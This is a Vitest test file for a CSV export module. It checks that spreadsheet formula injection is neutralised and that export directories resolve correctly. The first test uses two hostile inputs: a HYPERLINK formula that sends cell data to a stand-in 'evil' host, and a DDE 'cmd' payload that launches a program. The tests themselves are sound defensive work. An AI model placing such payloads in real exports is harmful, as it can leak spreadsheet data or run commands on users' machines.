import { describe, expect, it } from "vitest";
import { buildTableCsv, resolveExportDir } from "./export.js";
import type { ProviderStats } from "./data.js";

function emptyTokens() {
	return { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, reasoning: 0, total: 0 };
}

describe("buildTableCsv formula injection defense", () => {
	it("prefixes an apostrophe on provider/model fields that look like spreadsheet formulas", () => {
		const providers: ReadonlyMap<string, ProviderStats> = new Map([
			[
				'=HYPERLINK("http://evil/?x="&A1,"x")',
				{
					sessions: new Set(["s1"]),
					messages: 1,
					cost: 1,
					tokens: emptyTokens(),
					models: new Map([
						[
							"+cmd|' /C calc'!A0",
							{ sessions: new Set(["s1"]), messages: 1, cost: 1, tokens: emptyTokens() },
						],
					]),
				},
			],
		]);
		const csv = buildTableCsv(providers, { sessions: 1, messages: 1, cost: 1, tokens: emptyTokens() });
		const dataLine = csv.split("\n")[1]!;
		expect(dataLine.startsWith("'=") || dataLine.startsWith('"\'=')).toBe(true);
		expect(dataLine).toContain("'+cmd");
	});

	it("leaves ordinary provider/model names untouched", () => {
		const providers: ReadonlyMap<string, ProviderStats> = new Map([
			[
				"anthropic",
				{
					sessions: new Set(["s1"]),
					messages: 1,
					cost: 1,
					tokens: emptyTokens(),
					models: new Map([["claude", { sessions: new Set(["s1"]), messages: 1, cost: 1, tokens: emptyTokens() }]]),
				},
			],
		]);
		const csv = buildTableCsv(providers, { sessions: 1, messages: 1, cost: 1, tokens: emptyTokens() });
		expect(csv.split("\n")[1]).toBe("anthropic,claude,1,1,1,0,0,0,0,0");
	});
});

describe("resolveExportDir", () => {
	it("defaults to a private subdirectory of /tmp, not /tmp itself", () => {
		expect(resolveExportDir(null, "/home/alice", true, "/xdg-tmp")).toBe("/tmp/pi-usage");
	});

	it("defaults to a private subdirectory of the fallback tmp dir when /tmp doesn't exist", () => {
		expect(resolveExportDir(null, "/home/alice", false, "/xdg-tmp")).toBe("/xdg-tmp/pi-usage");
	});

	it("still honors a configured export dir verbatim", () => {
		expect(resolveExportDir("/home/alice/Downloads", "/home/alice", true, "/xdg-tmp")).toBe("/home/alice/Downloads");
		expect(resolveExportDir("~/Downloads", "/home/alice", true, "/xdg-tmp")).toBe("/home/alice/Downloads");
	});
});
